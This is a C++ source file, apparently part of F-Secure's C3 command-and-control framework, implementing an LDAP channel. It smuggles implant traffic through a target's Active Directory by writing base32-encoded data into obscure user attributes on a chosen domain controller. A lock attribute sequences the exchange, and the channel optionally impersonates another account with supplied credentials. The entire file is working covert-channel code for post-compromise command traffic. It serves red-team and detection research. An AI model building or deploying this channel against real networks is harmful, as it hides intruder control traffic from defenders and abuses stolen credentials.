#include "stdafx.h"
#ifndef SECURITY_WIN32 
#define SECURITY_WIN32 
#endif

#include "LDAP.h"
#include "Common/FSecure/Crypto/Base64.h"
#include <system_error>
#include <string>
#include "Common/FSecure/CppTools/StringConversions.h"
#include <locale>
#include <chrono>
#include <thread>
#include <stdio.h>      // Standard I/O
#include <comdef.h>     // COM definitions
#include <activeds.h>   // ADSI definitions
#include <cppcodec/base32_crockford.hpp>
#include <atlstr.h>
#pragma comment(lib, "Adsiid.lib")
#pragma comment(lib, "Activeds.lib")
#pragma comment(lib, "Secur32.lib")
#include <security.h>
#include <secext.h>
#include <Iads.h>
#include <adshlp.h>
#include <sstream>

using namespace FSecure::StringConversions;




//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::LDAP::LDAP(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
	, m_ldapAttribute{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_ldapLockAttribute{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_maxPacketSize{ arguments.Read<uint32_t>() }
	, m_domainController{ Convert<Utf16>(arguments.Read<std::string>()) }
	, m_username{ arguments.Read<std::string>() }
	, m_password{ arguments.Read<std::string>() }
{

	// Initalise COM
	HRESULT hr = CoInitialize(NULL);

	// Set up the directory object so we can query AD
	CreateDirectoryObject();

}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::LDAP::OnSendToChannel(ByteView data)
{
	// Check if the attribute is locked for writing already
	if (GetAttributeValue(m_ldapLockAttribute) == "empty")
	{
		// If not then lock it by setting the lock attribute to be the name of our intended recipient 
		SetAttribute(m_ldapLockAttribute, Convert<Utf16>(m_outboundDirectionName));
	}
	else {
		// It's locked which means it hasn't been read yet
		return 0;

	}

	// Find out what size chunks we're able to send
	size_t sizeOfDataToWrite = CalculateDataSize(data);

	// Encode the data
	std::string dataToWrite = EncodeData(data, sizeOfDataToWrite);

	// Write the data
	SetAttribute(m_ldapAttribute, Convert<Utf16>(dataToWrite));

	return sizeOfDataToWrite;

}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::LDAP::OnReceiveFromChannel()
{
	std::string attributeValue = GetAttributeValue(m_ldapAttribute);
	std::string lockValue = GetAttributeValue(m_ldapLockAttribute);

	// If attribute or lock is empty then nothing to be read
	if (attributeValue == "empty" || lockValue == "empty" || lockValue != m_inboundDirectionName)
	{
		return {};
	}

	// Decode attribute value and prepare to send it back
	size_t temp = attributeValue.size();
	ByteVector ret = cppcodec::base32_crockford::decode(attributeValue);
	
	// Clear the data attribute 
	ClearAttribute(m_ldapAttribute);

	// Clear the lock so that data can be written again
	ClearAttribute(m_ldapLockAttribute);

	return ret;
}


void FSecure::C3::Interfaces::Channels::LDAP::CreateDirectoryObject()
{
	if (m_username != "NULL" || m_password != "NULL")
	{
		HANDLE hToken = NULL;

		BOOL logonUserResult = LogonUserA(m_username.c_str(), NULL, m_password.c_str(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_WINNT50, &hToken);
		if (logonUserResult < 1) {
			CloseHandle(hToken);
			throw std::runtime_error{ "Failed to logon as target user" };
		}
		BOOL impersonateUserResult = ImpersonateLoggedOnUser(hToken);
		if (impersonateUserResult < 1) {
			CloseHandle(hToken);
			throw std::runtime_error{ "Failed to impersonate user" };
		}
		
	}
	// Get executing thread's FQDN
	TCHAR szDN[1024];
	ULONG ulSize = sizeof(szDN) / sizeof(szDN[0]);
	BOOL res = GetUserNameEx(NameFullyQualifiedDN, szDN, &ulSize);
	std::wstring ldapUrl = L"LDAP://" + m_domainController + L"/" + szDN;

	DWORD dwReturn = NULL;
	DWORD dwAttrs = NULL;
	HRESULT hr;
	if (m_username != "NULL" || m_password != "NULL")
	{
		std::wstring shortUsername = Convert<Utf16>(m_username.substr(0, m_username.find("@")));
		std::wstring password = Convert<Utf16>(m_password);

		hr = ADsOpenObject(ldapUrl.c_str(),
			shortUsername.c_str(), //For some reason it doesn't like UPN format
			password.c_str(),
			ADS_SECURE_AUTHENTICATION,
			IID_IDirectoryObject,
			(void**)&pDirObject);
	}
	else {
		hr = ADsOpenObject(ldapUrl.c_str(),
			NULL,
			NULL,
			ADS_SECURE_AUTHENTICATION,
			IID_IDirectoryObject,
			(void**)&pDirObject);
	}

	RevertToSelf();

	if (!SUCCEEDED(hr))
	{
		throw std::runtime_error{ "Couldn't bind to Active Directory." };
	}
}


void FSecure::C3::Interfaces::Channels::LDAP::ClearAttribute(std::wstring const& attribute)
{
	DWORD dwReturn = NULL;

	ADS_ATTR_INFO attrInfo[] = { {(LPWSTR)attribute.c_str(),ADS_ATTR_CLEAR, ADSTYPE_CASE_IGNORE_STRING, NULL, 1} };
	HRESULT hr = pDirObject->SetObjectAttributes(attrInfo, 1, &dwReturn);
	if (!SUCCEEDED(hr))
	{
		throw std::runtime_error{ "Couldn't clear attribute." };
	}
}

std::string FSecure::C3::Interfaces::Channels::LDAP::GetAttributeValue(std::wstring const& attribute)
{
	ADS_ATTR_INFO* pAttrInfo = NULL;
	

	LPWSTR pAttrNames[] = { const_cast<LPWSTR>(attribute.c_str()) };
	DWORD dwReturn = NULL;

	HRESULT hr = pDirObject->GetObjectAttributes(pAttrNames,
		1,
		&pAttrInfo,
		&dwReturn);
	
	if (SUCCEEDED(hr))
	{
		// Check if the attribute is empty, returning "empty" if so
		if (dwReturn < 1) {
			FreeADsMem(pAttrInfo);
			return "empty";
		}

		switch (pAttrInfo[0].dwADsType)
		{
		case ADSTYPE_CASE_IGNORE_STRING:
			FreeADsMem(pAttrInfo);
			return CW2A(pAttrInfo[0].pADsValues[0].CaseIgnoreString);
		case ADSTYPE_OCTET_STRING:
			std::string s(reinterpret_cast<char const*>(pAttrInfo[0].pADsValues[0].OctetString.lpValue), pAttrInfo[0].pADsValues[0].OctetString.dwLength);
			FreeADsMem(pAttrInfo);
			return Convert<Utf8>(s);

		}
		throw std::runtime_error{ "Couldn't read the attribute type, pick a better attribute." };
	}
	else {
		throw std::runtime_error{ "Failed to get attribute value." };
	}

}


void FSecure::C3::Interfaces::Channels::LDAP::SetAttribute(std::wstring const& attribute, std::wstring const& value)
{
	ADSVALUE  snValue;
	DWORD dwReturn = NULL;

	ADS_ATTR_INFO attrInfo[] = { (LPWSTR)attribute.c_str(), ADS_ATTR_UPDATE, ADSTYPE_CASE_IGNORE_STRING, &snValue, 1 };
	snValue.dwType = ADSTYPE_CASE_IGNORE_STRING;
	snValue.CaseExactString = (LPWSTR)value.c_str();

	HRESULT hr = pDirObject->SetObjectAttributes(attrInfo, 1, &dwReturn);

	if (!SUCCEEDED(hr))
	{
		throw std::runtime_error{ "Failed to set attribute, likely because it doesn't exist." };
	}

}



size_t FSecure::C3::Interfaces::Channels::LDAP::CalculateDataSize(ByteView data)
{
	auto maxPacketSize = cppcodec::base64_rfc4648::decoded_max_size(m_maxPacketSize);
	return std::min(maxPacketSize, data.size());
}



std::string FSecure::C3::Interfaces::Channels::LDAP::EncodeData(ByteView data, size_t dataSize)
{
	auto sendData = data.SubString(0, dataSize);
	return cppcodec::base32_crockford::encode(sendData.data(), sendData.size());
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::LDAP::GetCapability()
{
	return R"_(
{
    "create":
    {
        "arguments":
        [
            [
                {
                    "type": "string",
                    "name": "Input ID",
                    "min": 4,
                    "randomize": true,
                    "description": "Used to distinguish packets for the channel"
                },
                {
                    "type": "string",
                    "name": "Output ID",
                    "min": 4,
                    "randomize": true,
                    "description": "Used to distinguish packets from the channel"
                }
            ],
            {
                "type": "string",
                "name": "Data LDAP Attribute",
                "min": 1,
				"defaultValue": "mSMQSignCertificates",
                "description": "The LDAP attribute to write data into. Recommend mSMQSignCertificates (MANUALLY CHECK THAT IT IS EMPTY)"
            },
			{
                "type": "string",
                "name": "Lock LDAP Attribute",
                "min": 1,
				"defaultValue": "primaryInternationalISDNNumber",
                "description": "The LDAP attribute to use as the lock. Recommend primaryInternationalISDNNumber (MANUALLY CHECK THAT IT IS EMPTY)"
            },
			{
                "type": "uint32",
                "name": "Max Packet Size",
                "min": 1,
				"defaultValue": "524288",
                "description": "The maximum number of bytes that your selected LDAP attribute supports"
            },
			{
                "type": "string",
                "name": "Domain Controller",
                "min": 1,
				"defaultValue": "<FQDN>",
                "description": "The domain controller to target, avoids waiting for syncronisations"
            },
			{
                "type": "string",
                "name": "Username",
                "min": 1,
				"defaultValue": "NULL",
                "description": "The FQDN of the account to modify (i.e. fsecure@uk.test.com), defaults to executing user if NULL"
            },
			{
                "type": "string",
                "name": "Password",
                "min": 1,
				"defaultValue": "NULL",
                "description": "The password of the account to modify, defaults to executing user if NULL"
            }
        ]
    },
    "commands": []
}
)_";
}